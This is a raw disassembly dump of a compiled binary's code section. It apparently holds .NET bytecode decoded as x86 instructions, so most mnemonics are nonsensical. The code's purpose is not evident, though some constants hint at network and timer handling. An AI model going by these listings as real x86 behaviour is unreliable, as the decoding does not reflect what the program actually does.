  402b8b:	14 20                	adc    $0x20,%al
  402b8d:	c0 00 00             	rolb   $0x0,(%eax)
  402b90:	00 16                	add    %dl,(%esi)
  402b92:	6f                   	outsl  %ds:(%esi),(%dx)
  402b93:	39 00                	cmp    %eax,(%eax)
  402b95:	00 0a                	add    %cl,(%edx)
  402b97:	1a 6a 28             	sbb    0x28(%edx),%ch
  402b9a:	0d 00 00 06 28       	or     $0x28060000,%eax
  402b9f:	0c 00                	or     $0x0,%al
  402ba1:	00 06                	add    %al,(%esi)
  402ba3:	d4 8d                	aam    $0x8d
  402ba5:	44                   	inc    %esp
  402ba6:	00 00                	add    %al,(%eax)
  402ba8:	01 28                	add    %ebp,(%eax)
  402baa:	0b 00                	or     (%eax),%eax
  402bac:	00 06                	add    %al,(%esi)
  402bae:	16                   	push   %ss
  402baf:	6a 28                	push   $0x28
  402bb1:	0f 00 00             	sldt   (%eax)
  402bb4:	06                   	push   %es
  402bb5:	28 2f                	sub    %ch,(%edi)
  402bb7:	00 00                	add    %al,(%eax)
  402bb9:	06                   	push   %es
  402bba:	28 20                	sub    %ah,(%eax)
  402bbc:	00 00                	add    %al,(%eax)
  402bbe:	06                   	push   %es
  402bbf:	16                   	push   %ss
  402bc0:	28 18                	sub    %bl,(%eax)
  402bc2:	00 00                	add    %al,(%eax)
  402bc4:	06                   	push   %es
  402bc5:	16                   	push   %ss
  402bc6:	28 1a                	sub    %bl,(%edx)
  402bc8:	00 00                	add    %al,(%eax)
  402bca:	06                   	push   %es
  402bcb:	14 fe                	adc    $0xfe,%al
  402bcd:	06                   	push   %es
  402bce:	21 00                	and    %eax,(%eax)
  402bd0:	00 06                	add    %al,(%esi)
  402bd2:	73 3a                	jae    0x402c0e
  402bd4:	00 00                	add    %al,(%eax)
  402bd6:	0a 14 73             	or     (%ebx,%esi,2),%dl
  402bd9:	27                   	daa
  402bda:	00 00                	add    %al,(%eax)
  402bdc:	0a 20                	or     (%eax),%ah
  402bde:	10 27                	adc    %ah,(%edi)
  402be0:	00 00                	add    %al,(%eax)
  402be2:	20 98 3a 00 00 6f    	and    %bl,0x6f00003a(%eax)
  402be8:	32 00                	xor    (%eax),%al
  402bea:	00 0a                	add    %cl,(%edx)
  402bec:	73 27                	jae    0x402c15
  402bee:	00 00                	add    %al,(%eax)
  402bf0:	0a 20                	or     (%eax),%ah
  402bf2:	10 27                	adc    %ah,(%edi)
  402bf4:	00 00                	add    %al,(%eax)
  402bf6:	20 98 3a 00 00 6f    	and    %bl,0x6f00003a(%eax)
  402bfc:	32 00                	xor    (%eax),%al
  402bfe:	00 0a                	add    %cl,(%edx)
  402c00:	73 3b                	jae    0x402c3d
  402c02:	00 00                	add    %al,(%eax)
  402c04:	0a 28                	or     (%eax),%ch
  402c06:	11 00                	adc    %eax,(%eax)
  402c08:	00 06                	add    %al,(%esi)
  402c0a:	14 fe                	adc    $0xfe,%al
  402c0c:	06                   	push   %es
  402c0d:	22 00                	and    (%eax),%al
  402c0f:	00 06                	add    %al,(%esi)
  402c11:	73 3a                	jae    0x402c4d
  402c13:	00 00                	add    %al,(%eax)
  402c15:	0a 14 17             	or     (%edi,%edx,1),%dl
  402c18:	17                   	pop    %ss
  402c19:	73 3b                	jae    0x402c56
  402c1b:	00 00                	add    %al,(%eax)
  402c1d:	0a 28                	or     (%eax),%ch
  402c1f:	16                   	push   %ss
  402c20:	00 00                	add    %al,(%eax)
  402c22:	06                   	push   %es
  402c23:	28 08                	sub    %cl,(%eax)
  402c25:	00 00                	add    %al,(%eax)
  402c27:	06                   	push   %es
  402c28:	28 0a                	sub    %cl,(%edx)
  402c2a:	00 00                	add    %al,(%eax)
  402c2c:	06                   	push   %es
  402c2d:	28 0e                	sub    %cl,(%esi)
  402c2f:	00 00                	add    %al,(%eax)
  402c31:	06                   	push   %es
  402c32:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402c38:	69 14 fe 06 1f 00 00 	imul   $0x1f06,(%esi,%edi,8),%edx
  402c3f:	06                   	push   %es
  402c40:	73 3c                	jae    0x402c7e
  402c42:	00 00                	add    %al,(%eax)
  402c44:	0a 14 6f             	or     (%edi,%ebp,2),%dl
  402c47:	3d 00 00 0a 26       	cmp    $0x260a0000,%eax
  402c4c:	38 06                	cmp    %al,(%esi)
  402c4e:	00 00                	add    %al,(%eax)
  402c50:	00 16                	add    %dl,(%esi)
  402c52:	28 13                	sub    %dl,(%ebx)
  402c54:	00 00                	add    %al,(%eax)
  402c56:	06                   	push   %es
  402c57:	dd 0c 00             	fisttpll (%eax,%eax,1)
  402c5a:	00 00                	add    %al,(%eax)
  402c5c:	26 16                	es push %ss
  402c5e:	28 13                	sub    %dl,(%ebx)
  402c60:	00 00                	add    %al,(%eax)
  402c62:	06                   	push   %es
  402c63:	dd 00                	fldl   (%eax)
  402c65:	00 00                	add    %al,(%eax)
  402c67:	00 2a                	add    %ch,(%edx)
  402c69:	00 00                	add    %al,(%eax)
  402c6b:	00 41 4c             	add    %al,0x4c(%ecx)
  402c6e:	00 00                	add    %al,(%eax)
  402c70:	00 00                	add    %al,(%eax)
  402c72:	00 00                	add    %al,(%eax)
  402c74:	ce                   	into
  402c75:	00 00                	add    %al,(%eax)
  402c77:	00 26                	add    %ah,(%esi)
  402c79:	00 00                	add    %al,(%eax)
  402c7b:	00 f4                	add    %dh,%ah
  402c7d:	00 00                	add    %al,(%eax)
  402c7f:	00 06                	add    %al,(%esi)
  402c81:	00 00                	add    %al,(%eax)
  402c83:	00 01                	add    %al,(%ecx)
  402c85:	00 00                	add    %al,(%eax)
  402c87:	01 02                	add    %eax,(%edx)
  402c89:	00 00                	add    %al,(%eax)
  402c8b:	00 21                	add    %ah,(%ecx)
  402c8d:	01 00                	add    %eax,(%eax)
  402c8f:	00 82 00 00 00 a3    	add    %al,-0x5d000000(%edx)
  402c95:	01 00                	add    %eax,(%eax)
  402c97:	00 0f                	add    %cl,(%edi)
	...
  402ca5:	00 00                	add    %al,(%eax)
  402ca7:	00 e4                	add    %ah,%ah
  402ca9:	02 00                	add    (%eax),%al
  402cab:	00 e4                	add    %ah,%ah
  402cad:	02 00                	add    (%eax),%al
  402caf:	00 0c 00             	add    %cl,(%eax,%eax,1)
  402cb2:	00 00                	add    %al,(%eax)
  402cb4:	01 00                	add    %eax,(%eax)
  402cb6:	00 01                	add    %al,(%ecx)
  402cb8:	1b 30                	sbb    (%eax),%esi
  402cba:	02 00                	add    (%eax),%al
  402cbc:	6a 00                	push   $0x0
  402cbe:	00 00                	add    %al,(%eax)
  402cc0:	00 00                	add    %al,(%eax)
  402cc2:	00 00                	add    %al,(%eax)
  402cc4:	28 08                	sub    %cl,(%eax)
  402cc6:	00 00                	add    %al,(%eax)
  402cc8:	06                   	push   %es
  402cc9:	25 3a 06 00 00       	and    $0x63a,%eax
  402cce:	00 26                	add    %ah,(%esi)
  402cd0:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402cd6:	40                   	inc    %eax
  402cd7:	00 00                	add    %al,(%eax)
  402cd9:	0a 28                	or     (%eax),%ch
  402cdb:	06                   	push   %es
  402cdc:	00 00                	add    %al,(%eax)
  402cde:	06                   	push   %es
  402cdf:	25 3a 06 00 00       	and    $0x63a,%eax
  402ce4:	00 26                	add    %ah,(%esi)
  402ce6:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402cec:	41                   	inc    %ecx
  402ced:	00 00                	add    %al,(%eax)
  402cef:	0a 28                	or     (%eax),%ch
  402cf1:	15 00 00 06 25       	adc    $0x25060000,%eax
  402cf6:	3a 06                	cmp    (%esi),%al
  402cf8:	00 00                	add    %al,(%eax)
  402cfa:	00 26                	add    %ah,(%esi)
  402cfc:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402d02:	42                   	inc    %edx
  402d03:	00 00                	add    %al,(%eax)
  402d05:	0a 28                	or     (%eax),%ch
  402d07:	10 00                	adc    %al,(%eax)
  402d09:	00 06                	add    %al,(%esi)
  402d0b:	25 3a 06 00 00       	and    $0x63a,%eax
  402d10:	00 26                	add    %ah,(%esi)
  402d12:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402d18:	42                   	inc    %edx
  402d19:	00 00                	add    %al,(%eax)
  402d1b:	0a dd                	or     %ch,%bl
  402d1d:	06                   	push   %es
  402d1e:	00 00                	add    %al,(%eax)
  402d20:	00 26                	add    %ah,(%esi)
  402d22:	dd 00                	fldl   (%eax)
  402d24:	00 00                	add    %al,(%eax)
  402d26:	00 16                	add    %dl,(%esi)
  402d28:	28 13                	sub    %dl,(%ebx)
  402d2a:	00 00                	add    %al,(%eax)
  402d2c:	06                   	push   %es
  402d2d:	2a 00                	sub    (%eax),%al
  402d2f:	00 01                	add    %al,(%ecx)
  402d31:	10 00                	adc    %al,(%eax)
  402d33:	00 00                	add    %al,(%eax)
  402d35:	00 00                	add    %al,(%eax)
  402d37:	00 5d 5d             	add    %bl,0x5d(%ebp)
  402d3a:	00 06                	add    %al,(%esi)
  402d3c:	01 00                	add    %eax,(%eax)
  402d3e:	00 01                	add    %al,(%ecx)
  402d40:	1b 30                	sbb    (%eax),%esi
  402d42:	06                   	push   %es
  402d43:	00 ba 01 00 00 04    	add    %bh,0x4000001(%edx)
  402d49:	00 00                	add    %al,(%eax)
  402d4b:	11 28                	adc    %ebp,(%eax)
  402d4d:	06                   	push   %es
  402d4e:	00 00                	add    %al,(%eax)
  402d50:	06                   	push   %es
  402d51:	6f                   	outsl  %ds:(%esi),(%dx)
  402d52:	2b 00                	sub    (%eax),%eax
  402d54:	00 0a                	add    %cl,(%edx)
  402d56:	39 0a                	cmp    %ecx,(%edx)
  402d58:	00 00                	add    %al,(%eax)
  402d5a:	00 28                	add    %ch,(%eax)
  402d5c:	12 00                	adc    (%eax),%al
  402d5e:	00 06                	add    %al,(%esi)
  402d60:	3a 0b                	cmp    (%ebx),%cl
  402d62:	00 00                	add    %al,(%eax)
  402d64:	00 16                	add    %dl,(%esi)
  402d66:	28 13                	sub    %dl,(%ebx)
  402d68:	00 00                	add    %al,(%eax)
  402d6a:	06                   	push   %es
  402d6b:	dd 95 01 00 00 28    	fstl   0x28000001(%ebp)
  402d71:	08 00                	or     %al,(%eax)
  402d73:	00 06                	add    %al,(%esi)
  402d75:	02 6f 43             	add    0x43(%edi),%ch
  402d78:	00 00                	add    %al,(%eax)
  402d7a:	0a 0a                	or     (%edx),%cl
  402d7c:	06                   	push   %es
  402d7d:	16                   	push   %ss
  402d7e:	3e 6b 01 00          	imul   $0x0,%ds:(%ecx),%eax
  402d82:	00 28                	add    %ch,(%eax)
  402d84:	0e                   	push   %cs
  402d85:	00 00                	add    %al,(%eax)
  402d87:	06                   	push   %es
  402d88:	06                   	push   %es
  402d89:	6a 58                	push   $0x58
  402d8b:	28 0f                	sub    %cl,(%edi)
  402d8d:	00 00                	add    %al,(%eax)
  402d8f:	06                   	push   %es
  402d90:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402d93:	00 06                	add    %al,(%esi)
  402d95:	06                   	push   %es
  402d96:	6a 59                	push   $0x59
  402d98:	28 0d 00 00 06 28    	sub    %cl,0x28060000
  402d9e:	0c 00                	or     $0x0,%al
  402da0:	00 06                	add    %al,(%esi)
  402da2:	3a 02                	cmp    (%edx),%al
  402da4:	01 00                	add    %eax,(%eax)
  402da6:	00 28                	add    %ch,(%eax)
  402da8:	0a 00                	or     (%eax),%al
  402daa:	00 06                	add    %al,(%esi)
  402dac:	16                   	push   %ss
  402dad:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  402db1:	0a 6a 28             	or     0x28(%edx),%ch
  402db4:	0d 00 00 06 28       	or     $0x28060000,%eax
  402db9:	0c 00                	or     $0x0,%al
  402dbb:	00 06                	add    %al,(%esi)
  402dbd:	16                   	push   %ss
  402dbe:	6a 3e                	push   $0x3e
  402dc0:	c2 00 00             	ret    $0x0
  402dc3:	00 16                	add    %dl,(%esi)
  402dc5:	6a 28                	push   $0x28
  402dc7:	0f 00 00             	sldt   (%eax)
  402dca:	06                   	push   %es
  402dcb:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402dce:	00 06                	add    %al,(%esi)
  402dd0:	d4 8d                	aam    $0x8d
  402dd2:	44                   	inc    %esp
  402dd3:	00 00                	add    %al,(%eax)
  402dd5:	01 28                	add    %ebp,(%eax)
  402dd7:	0b 00                	or     (%eax),%eax
  402dd9:	00 06                	add    %al,(%esi)
  402ddb:	38 5f 00             	cmp    %bl,0x0(%edi)
  402dde:	00 00                	add    %al,(%eax)
  402de0:	28 08                	sub    %cl,(%eax)
  402de2:	00 00                	add    %al,(%eax)
  402de4:	06                   	push   %es
  402de5:	28 0a                	sub    %cl,(%edx)
  402de7:	00 00                	add    %al,(%eax)
  402de9:	06                   	push   %es
  402dea:	28 0e                	sub    %cl,(%esi)
  402dec:	00 00                	add    %al,(%eax)
  402dee:	06                   	push   %es
  402def:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402df5:	69 6f 45 00 00 0a 0b 	imul   $0xb0a0000,0x45(%edi),%ebp
  402dfc:	07                   	pop    %es
  402dfd:	16                   	push   %ss
  402dfe:	3d 0b 00 00 00       	cmp    $0xb,%eax
  402e03:	16                   	push   %ss
  402e04:	28 13                	sub    %dl,(%ebx)
  402e06:	00 00                	add    %al,(%eax)
  402e08:	06                   	push   %es
  402e09:	dd f7                	(bad)
  402e0b:	00 00                	add    %al,(%eax)
  402e0d:	00 28                	add    %ch,(%eax)
  402e0f:	0e                   	push   %cs
  402e10:	00 00                	add    %al,(%eax)
  402e12:	06                   	push   %es
  402e13:	07                   	pop    %es
  402e14:	6a 58                	push   $0x58
  402e16:	28 0f                	sub    %cl,(%edi)
  402e18:	00 00                	add    %al,(%eax)
  402e1a:	06                   	push   %es
  402e1b:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402e1e:	00 06                	add    %al,(%esi)
  402e20:	07                   	pop    %es
  402e21:	6a 59                	push   $0x59
  402e23:	28 0d 00 00 06 28    	sub    %cl,0x28060000
  402e29:	0c 00                	or     $0x0,%al
  402e2b:	00 06                	add    %al,(%esi)
  402e2d:	16                   	push   %ss
  402e2e:	6a 3c                	push   $0x3c
  402e30:	0b 00                	or     (%eax),%eax
  402e32:	00 00                	add    %al,(%eax)
  402e34:	16                   	push   %ss
  402e35:	28 13                	sub    %dl,(%ebx)
  402e37:	00 00                	add    %al,(%eax)
  402e39:	06                   	push   %es
  402e3a:	dd c6                	ffree  %st(6)
  402e3c:	00 00                	add    %al,(%eax)
  402e3e:	00 28                	add    %ch,(%eax)
  402e40:	0c 00                	or     $0x0,%al
  402e42:	00 06                	add    %al,(%esi)
  402e44:	16                   	push   %ss
  402e45:	6a 30                	push   $0x30
  402e47:	98                   	cwtl
  402e48:	14 fe                	adc    $0xfe,%al
  402e4a:	06                   	push   %es
  402e4b:	46                   	inc    %esi
  402e4c:	00 00                	add    %al,(%eax)
  402e4e:	06                   	push   %es
  402e4f:	73 46                	jae    0x402e97
  402e51:	00 00                	add    %al,(%eax)
  402e53:	0a 73 47             	or     0x47(%ebx),%dh
  402e56:	00 00                	add    %al,(%eax)
  402e58:	0a 28                	or     (%eax),%ch
  402e5a:	0a 00                	or     (%eax),%al
  402e5c:	00 06                	add    %al,(%esi)
  402e5e:	6f                   	outsl  %ds:(%esi),(%dx)
  402e5f:	48                   	dec    %eax
  402e60:	00 00                	add    %al,(%eax)
  402e62:	0a 16                	or     (%esi),%dl
  402e64:	6a 28                	push   $0x28
  402e66:	0f 00 00             	sldt   (%eax)
  402e69:	06                   	push   %es
  402e6a:	1a 6a 28             	sbb    0x28(%edx),%ch
  402e6d:	0d 00 00 06 28       	or     $0x28060000,%eax
  402e72:	0c 00                	or     $0x0,%al
  402e74:	00 06                	add    %al,(%esi)
  402e76:	d4 8d                	aam    $0x8d
  402e78:	44                   	inc    %esp
  402e79:	00 00                	add    %al,(%eax)
  402e7b:	01 28                	add    %ebp,(%eax)
  402e7d:	0b 00                	or     (%eax),%eax
  402e7f:	00 06                	add    %al,(%esi)
  402e81:	38 3a                	cmp    %bh,(%edx)
  402e83:	00 00                	add    %al,(%eax)
  402e85:	00 1a                	add    %bl,(%edx)
  402e87:	6a 28                	push   $0x28
  402e89:	0d 00 00 06 28       	or     $0x28060000,%eax
  402e8e:	0c 00                	or     $0x0,%al
  402e90:	00 06                	add    %al,(%esi)
  402e92:	d4 8d                	aam    $0x8d
  402e94:	44                   	inc    %esp
  402e95:	00 00                	add    %al,(%eax)
  402e97:	01 28                	add    %ebp,(%eax)
  402e99:	0b 00                	or     (%eax),%eax
  402e9b:	00 06                	add    %al,(%esi)
  402e9d:	16                   	push   %ss
  402e9e:	6a 28                	push   $0x28
  402ea0:	0f 00 00             	sldt   (%eax)
  402ea3:	06                   	push   %es
  402ea4:	38 17                	cmp    %dl,(%edi)
  402ea6:	00 00                	add    %al,(%eax)
  402ea8:	00 28                	add    %ch,(%eax)
  402eaa:	0c 00                	or     $0x0,%al
  402eac:	00 06                	add    %al,(%esi)
  402eae:	16                   	push   %ss
  402eaf:	6a 3c                	push   $0x3c
  402eb1:	0b 00                	or     (%eax),%eax
  402eb3:	00 00                	add    %al,(%eax)
  402eb5:	16                   	push   %ss
  402eb6:	28 13                	sub    %dl,(%ebx)
  402eb8:	00 00                	add    %al,(%eax)
  402eba:	06                   	push   %es
  402ebb:	dd 45 00             	fldl   0x0(%ebp)
  402ebe:	00 00                	add    %al,(%eax)
  402ec0:	28 08                	sub    %cl,(%eax)
  402ec2:	00 00                	add    %al,(%eax)
  402ec4:	06                   	push   %es
  402ec5:	28 0a                	sub    %cl,(%edx)
  402ec7:	00 00                	add    %al,(%eax)
  402ec9:	06                   	push   %es
  402eca:	28 0e                	sub    %cl,(%esi)
  402ecc:	00 00                	add    %al,(%eax)
  402ece:	06                   	push   %es
  402ecf:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402ed5:	69 14 fe 06 1f 00 00 	imul   $0x1f06,(%esi,%edi,8),%edx
  402edc:	06                   	push   %es
  402edd:	73 3c                	jae    0x402f1b
  402edf:	00 00                	add    %al,(%eax)
  402ee1:	0a 14 6f             	or     (%edi,%ebp,2),%dl
  402ee4:	3d 00 00 0a 26       	cmp    $0x260a0000,%eax
  402ee9:	38 06                	cmp    %al,(%esi)
  402eeb:	00 00                	add    %al,(%eax)
  402eed:	00 16                	add    %dl,(%esi)
  402eef:	28 13                	sub    %dl,(%ebx)
  402ef1:	00 00                	add    %al,(%eax)
  402ef3:	06                   	push   %es
  402ef4:	dd 0c 00             	fisttpll (%eax,%eax,1)
  402ef7:	00 00                	add    %al,(%eax)
  402ef9:	26 16                	es push %ss
  402efb:	28 13                	sub    %dl,(%ebx)
  402efd:	00 00                	add    %al,(%eax)
  402eff:	06                   	push   %es
  402f00:	dd 00                	fldl   (%eax)
  402f02:	00 00                	add    %al,(%eax)
  402f04:	00 2a                	add    %ch,(%edx)
  402f06:	00 00                	add    %al,(%eax)
  402f08:	41                   	inc    %ecx
  402f09:	1c 00                	sbb    $0x0,%al
	...
  402f13:	00 ad 01 00 00 ad    	add    %ch,-0x52ffffff(%ebp)
  402f19:	01 00                	add    %eax,(%eax)
  402f1b:	00 0c 00             	add    %cl,(%eax,%eax,1)
  402f1e:	00 00                	add    %al,(%eax)
  402f20:	01 00                	add    %eax,(%eax)
  402f22:	00 01                	add    %al,(%ecx)
  402f24:	1b 30                	sbb    (%eax),%esi
  402f26:	04 00                	add    $0x0,%al
  402f28:	04 01                	add    $0x1,%al
  402f2a:	00 00                	add    %al,(%eax)
  402f2c:	05 00 00 11 28       	add    $0x28110000,%eax
  402f31:	14 00                	adc    $0x0,%al
  402f33:	00 06                	add    %al,(%esi)
  402f35:	0a 16                	or     (%esi),%dl
  402f37:	0b 06                	or     (%esi),%eax
  402f39:	12 01                	adc    (%ecx),%al
  402f3b:	28 49 00             	sub    %cl,0x0(%ecx)
  402f3e:	00 0a                	add    %cl,(%edx)
  402f40:	28 12                	sub    %dl,(%edx)
  402f42:	00 00                	add    %al,(%eax)
  402f44:	06                   	push   %es
  402f45:	3a 05 00 00 00 dd    	cmp    0xdd000000,%al
  402f4b:	e4 00                	in     $0x0,%al
  402f4d:	00 00                	add    %al,(%eax)
  402f4f:	02 8e 69 28 4a 00    	add    0x4a2869(%esi),%cl
  402f55:	00 0a                	add    %cl,(%edx)
  402f57:	0c 28                	or     $0x28,%al
  402f59:	06                   	push   %es
  402f5a:	00 00                	add    %al,(%eax)
  402f5c:	06                   	push   %es
  402f5d:	15 17 6f 4b 00       	adc    $0x4b6f17,%eax
  402f62:	00 0a                	add    %cl,(%edx)
  402f64:	26 28 08             	sub    %cl,%es:(%eax)
  402f67:	00 00                	add    %al,(%eax)
  402f69:	06                   	push   %es
  402f6a:	08 16                	or     %dl,(%esi)
  402f6c:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  402f72:	00 0a                	add    %cl,(%edx)
  402f74:	02 8e 69 20 40 42    	add    0x42402069(%esi),%cl
  402f7a:	0f 00                	(bad)
  402f7c:	3e 6e                	outsb  %ds:(%esi),(%dx)
  402f7e:	00 00                	add    %al,(%eax)
  402f80:	00 02                	add    %al,(%edx)
  402f82:	73 4d                	jae    0x402fd1
  402f84:	00 00                	add    %al,(%eax)
  402f86:	0a 0d 16 13 04 09    	or     0x9041316,%cl
  402f8c:	16                   	push   %ss
  402f8d:	6a 6f                	push   $0x6f
  402f8f:	4e                   	dec    %esi
  402f90:	00 00                	add    %al,(%eax)
  402f92:	0a 20                	or     (%eax),%ah
  402f94:	50                   	push   %eax
  402f95:	c3                   	ret
  402f96:	00 00                	add    %al,(%eax)
  402f98:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  402f9c:	01 13                	add    %edx,(%ebx)
  402f9e:	05 38 26 00 00       	add    $0x2638,%eax
  402fa3:	00 28                	add    %ch,(%eax)
  402fa5:	06                   	push   %es
  402fa6:	00 00                	add    %al,(%eax)
  402fa8:	06                   	push   %es
  402fa9:	15 17 6f 4b 00       	adc    $0x4b6f17,%eax
  402fae:	00 0a                	add    %cl,(%edx)
  402fb0:	26 28 08             	sub    %cl,%es:(%eax)
  402fb3:	00 00                	add    %al,(%eax)
  402fb5:	06                   	push   %es
  402fb6:	11 05 16 11 04 6f    	adc    %eax,0x6f041116
  402fbc:	4c                   	dec    %esp
  402fbd:	00 00                	add    %al,(%eax)
  402fbf:	0a 28                	or     (%eax),%ch
  402fc1:	08 00                	or     %al,(%eax)
  402fc3:	00 06                	add    %al,(%esi)
  402fc5:	6f                   	outsl  %ds:(%esi),(%dx)
  402fc6:	4f                   	dec    %edi
  402fc7:	00 00                	add    %al,(%eax)
  402fc9:	0a 09                	or     (%ecx),%cl
  402fcb:	11 05 16 11 05 8e    	adc    %eax,0x8e051116
  402fd1:	69 6f 45 00 00 0a 25 	imul   $0x250a0000,0x45(%edi),%ebp
  402fd8:	13 04 16             	adc    (%esi,%edx,1),%eax
  402fdb:	30 c7                	xor    %al,%bh
  402fdd:	dd 33                	fnsave (%ebx)
  402fdf:	00 00                	add    %al,(%eax)
  402fe1:	00 09                	add    %cl,(%ecx)
  402fe3:	39 06                	cmp    %eax,(%esi)
  402fe5:	00 00                	add    %al,(%eax)
  402fe7:	00 09                	add    %cl,(%ecx)
  402fe9:	6f                   	outsl  %ds:(%esi),(%dx)
  402fea:	33 00                	xor    (%eax),%eax
  402fec:	00 0a                	add    %cl,(%edx)
  402fee:	dc 28                	fsubrl (%eax)
  402ff0:	06                   	push   %es
  402ff1:	00 00                	add    %al,(%eax)
  402ff3:	06                   	push   %es
  402ff4:	15 17 6f 4b 00       	adc    $0x4b6f17,%eax
  402ff9:	00 0a                	add    %cl,(%edx)
  402ffb:	26 28 08             	sub    %cl,%es:(%eax)
  402ffe:	00 00                	add    %al,(%eax)
  403000:	06                   	push   %es
  403001:	02 16                	add    (%esi),%dl
  403003:	02 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%cl
  403009:	00 0a                	add    %cl,(%edx)
  40300b:	28 08                	sub    %cl,(%eax)
  40300d:	00 00                	add    %al,(%eax)
  40300f:	06                   	push   %es
  403010:	6f                   	outsl  %ds:(%esi),(%dx)
  403011:	4f                   	dec    %edi
  403012:	00 00                	add    %al,(%eax)
  403014:	0a dd                	or     %ch,%bl
  403016:	19 00                	sbb    %eax,(%eax)
  403018:	00 00                	add    %al,(%eax)
  40301a:	26 16                	es push %ss
  40301c:	28 13                	sub    %dl,(%ebx)
  40301e:	00 00                	add    %al,(%eax)
  403020:	06                   	push   %es
  403021:	dd 0d 00 00 00 07    	fisttpll 0x7000000
  403027:	39 06                	cmp    %eax,(%esi)
  403029:	00 00                	add    %al,(%eax)
  40302b:	00 06                	add    %al,(%esi)
  40302d:	28 50 00             	sub    %dl,0x0(%eax)
  403030:	00 0a                	add    %cl,(%edx)
  403032:	dc 2a                	fsubrl (%edx)
  403034:	01 28                	add    %ebp,(%eax)
  403036:	00 00                	add    %al,(%eax)
  403038:	02 00                	add    (%eax),%al
  40303a:	58                   	pop    %eax
  40303b:	00 5a b2             	add    %bl,-0x4e(%edx)
  40303e:	00 0d 00 00 00 00    	add    %cl,0x0
  403044:	00 00                	add    %al,(%eax)
  403046:	10 00                	adc    %al,(%eax)
  403048:	da ea                	(bad)
  40304a:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  40304d:	00 00                	add    %al,(%eax)
  40304f:	01 02                	add    %eax,(%edx)
  403051:	00 08                	add    %cl,(%eax)
  403053:	00 ee                	add    %ch,%dh
  403055:	f6 00 0d             	testb  $0xd,(%eax)
  403058:	00 00                	add    %al,(%eax)
  40305a:	00 00                	add    %al,(%eax)
  40305c:	1b 30                	sbb    (%eax),%esi
  40305e:	03 00                	add    (%eax),%eax
  403060:	50                   	push   %eax
  403061:	00 00                	add    %al,(%eax)
  403063:	00 00                	add    %al,(%eax)
  403065:	00 00                	add    %al,(%eax)
  403067:	00 73 94             	add    %dh,-0x6c(%ebx)
  40306a:	00 00                	add    %al,(%eax)
  40306c:	06                   	push   %es
  40306d:	25 72 70 21 00       	and    $0x217072,%eax
  403072:	70 6f                	jo     0x4030e3
  403074:	7f 00                	jg     0x403076
  403076:	00 06                	add    %al,(%esi)
  403078:	72 7e                	jb     0x4030f8
  40307a:	21 00                	and    %eax,(%eax)
  40307c:	70 6f                	jo     0x4030ed
  40307e:	8c 00                	mov    %es,(%eax)
  403080:	00 06                	add    %al,(%esi)
  403082:	25 72 88 21 00       	and    $0x218872,%eax
  403087:	70 6f                	jo     0x4030f8
  403089:	7f 00                	jg     0x40308b
  40308b:	00 06                	add    %al,(%esi)
  40308d:	28 35 00 00 06 6f    	sub    %dh,0x6f060000
  403093:	8c 00                	mov    %es,(%eax)
  403095:	00 06                	add    %al,(%esi)
  403097:	6f                   	outsl  %ds:(%esi),(%dx)
  403098:	89 00                	mov    %eax,(%eax)
  40309a:	00 06                	add    %al,(%esi)
  40309c:	28 20                	sub    %ah,(%eax)
  40309e:	00 00                	add    %al,(%eax)
  4030a0:	06                   	push   %es
  4030a1:	28 51 00             	sub    %dl,0x0(%ecx)
  4030a4:	00 0a                	add    %cl,(%edx)
  4030a6:	17                   	pop    %ss
  4030a7:	28 1a                	sub    %bl,(%edx)
  4030a9:	00 00                	add    %al,(%eax)
  4030ab:	06                   	push   %es
  4030ac:	dd 06                	fldl   (%esi)
  4030ae:	00 00                	add    %al,(%eax)
  4030b0:	00 26                	add    %ah,(%esi)
  4030b2:	dd 00                	fldl   (%eax)
  4030b4:	00 00                	add    %al,(%eax)
  4030b6:	00 2a                	add    %ch,(%edx)
  4030b8:	01 10                	add    %edx,(%eax)
  4030ba:	00 00                	add    %al,(%eax)
  4030bc:	00 00                	add    %al,(%eax)
  4030be:	00 00                	add    %al,(%eax)
  4030c0:	49                   	dec    %ecx
  4030c1:	49                   	dec    %ecx
  4030c2:	00 06                	add    %al,(%esi)
  4030c4:	01 00                	add    %eax,(%eax)
  4030c6:	00 01                	add    %al,(%ecx)
  4030c8:	1b 30                	sbb    (%eax),%esi
  4030ca:	02 00                	add    (%eax),%al
  4030cc:	2c 00                	sub    $0x0,%al
  4030ce:	00 00                	add    %al,(%eax)
  4030d0:	00 00                	add    %al,(%eax)
  4030d2:	00 00                	add    %al,(%eax)
  4030d4:	28 19                	sub    %bl,(%ecx)
  4030d6:	00 00                	add    %al,(%eax)
  4030d8:	06                   	push   %es
  4030d9:	39 16                	cmp    %edx,(%esi)
  4030db:	00 00                	add    %al,(%eax)
  4030dd:	00 28                	add    %ch,(%eax)
  4030df:	12 00                	adc    (%eax),%al
  4030e1:	00 06                	add    %al,(%esi)
  4030e3:	39 0c 00             	cmp    %ecx,(%eax,%eax,1)
  4030e6:	00 00                	add    %al,(%eax)
  4030e8:	28 17                	sub    %dl,(%edi)
  4030ea:	00 00                	add    %al,(%eax)
  4030ec:	06                   	push   %es
  4030ed:	17                   	pop    %ss
  4030ee:	58                   	pop    %eax
  4030ef:	28 18                	sub    %bl,(%eax)
  4030f1:	00 00                	add    %al,(%eax)
  4030f3:	06                   	push   %es
  4030f4:	dd 06                	fldl   (%esi)
  4030f6:	00 00                	add    %al,(%eax)
  4030f8:	00 26                	add    %ah,(%esi)
  4030fa:	dd 00                	fldl   (%eax)
  4030fc:	00 00                	add    %al,(%eax)
  4030fe:	00 2a                	add    %ch,(%edx)
  403100:	01 10                	add    %edx,(%eax)
  403102:	00 00                	add    %al,(%eax)
  403104:	00 00                	add    %al,(%eax)
  403106:	00 00                	add    %al,(%eax)
  403108:	25 25 00 06 01       	and    $0x1060025,%eax
  40310d:	00 00                	add    %al,(%eax)
